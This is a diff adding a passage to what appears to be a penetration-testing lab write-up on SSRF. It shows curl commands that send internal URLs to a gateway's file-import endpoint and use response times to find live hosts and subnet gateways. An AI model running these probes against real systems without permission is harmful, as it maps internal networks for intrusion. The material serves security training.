@@ -335,3 +335,16 @@ On the other hand, there are three established ranges for private IP addresses.
 
 Scanning an entire `/8` or even a `/12` network via SSRF could take several days. Rather than scanning an entire subnet, we can try scanning for network gateways. Network designs commonly use a `/16` or `/24` subnet mask with the gateway running on the IP where the forth octet is `".1"` (for example: `192.168.1.1/24` or `172.16.0.1/16`). However, gateways can live on any IP address and subnets can be any size. 
 
+As we noticed during our port scan, the Axios library will respond relatively quickly with `ECONNREFUSED` when a port is closed but the host is up.
+
+```bash
+kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:6666"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
+Total: 178631 microseconds
+```
+A request to a closed port took **0.178631 seconds**. However, If the host is not reachable, the server will take much longer and timeout.
+
+```bash
+kali@kali:~$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://10.66.66.66"}' http://apigateway:8000/files/import -s -w 'Total: %{time_total} microseconds\n' -o /dev/null
+Total: 60155041 microseconds
+```
+A request to an invalid host took **60.155041 seconds**. We can assume that the timeout is configured to one minute. Using this information, we can deduce if an IP is valid or not, in a technique similar to an Nmap host scan. If we search for a gateway (assuming the gateway ends with `".1"`), we can discover the subnet the containers are running on.
